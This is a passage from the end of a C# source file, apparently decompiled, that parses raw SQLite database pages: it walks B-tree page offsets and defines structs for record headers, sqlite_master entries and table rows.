                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(m * 2))), 2);
                    ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num13), 4)), decimal.One), new decimal(page_size))));
                }

                ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }

            return true;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct record_header_field
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct sqlite_master_entry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public readonly string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct table_entry
        {
            public long row_id;
            public string[] content;
        }
    }
}
